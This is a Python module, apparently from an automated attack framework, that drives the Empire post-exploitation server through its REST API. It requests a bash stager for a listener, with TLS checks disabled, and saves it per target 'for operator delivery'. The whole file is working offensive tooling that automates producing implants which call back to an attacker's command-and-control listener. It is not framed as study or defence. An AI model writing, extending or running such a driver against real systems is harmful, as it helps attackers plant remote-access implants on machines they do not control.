# modules/drivers/post_exploit/empire_driver.py

import os
import requests
from urllib.parse import urljoin
from modules.core.driver import BaseToolDriver, DriverResult, ParsedResult

class EmpireDriver(BaseToolDriver):
    """
    Driver for Empire post-exploitation via its REST API.
    Generates a bash stager, saves it for delivery, and parses it.
    """
    name = "post"

    def __init__(self, config, session_mgr, logger):
        super().__init__(config, session_mgr, logger)
        self.api_url = config.get("empire_api_url", "http://127.0.0.1:1337/api/v2").rstrip("/")
        self.token = config["empire_api_token"]
        self.listener = config.get("empire_listener", "http")
        self.outdir = config.get("empire_output_dir", "results/raw/empire")
        os.makedirs(self.outdir, exist_ok=True)

    def run(self, target: str, **kwargs) -> DriverResult:
        """
        1. Request a bash launcher from Empire API.
        2. Save the launcher script to disk.
        """
        headers = {"Authorization": f"Bearer {self.token}"}
        payload = {
            "Listener": self.listener,
            "Language": "bash"
        }

        url = urljoin(self.api_url + "/", "launcher")
        try:
            self.logger.info(f"[EmpireDriver] Requesting launcher for listener '{self.listener}'", extra={"target": target})
            resp = requests.post(url, headers=headers, json=payload, timeout=30, verify=False)
            resp.raise_for_status()
        except requests.RequestException as e:
            self.logger.error(f"[EmpireDriver] API error: {e}")
            return DriverResult(raw_output=None)

        # Empire returns in 'results' or 'data'
        data = resp.json().get("results") or resp.json().get("data", {})
        launcher = data.get("launcher") or data.get("Launcher")
        if not launcher:
            self.logger.error("[EmpireDriver] No launcher in response")
            return DriverResult(raw_output=None)

        # Save to file for operator delivery
        safe = target.replace("://", "_").replace("/", "_")
        out_file = os.path.join(self.outdir, f"{safe}.sh")
        with open(out_file, "w") as f:
            f.write(launcher)
        self.logger.info(f"[EmpireDriver] Launcher saved to {out_file}", extra={"target": target})

        return DriverResult(raw_output=out_file)

    def parse(self, raw_output_path: str) -> ParsedResult:
        """
        Reads the saved launcher script and returns it as parsed data.
        """
        try:
            with open(raw_output_path) as f:
                content = f.read()
        except Exception as e:
            self.logger.warning(f"[EmpireDriver] Cannot read {raw_output_path}: {e}")
            return ParsedResult(data={})
        return ParsedResult(data={"launcher": content})
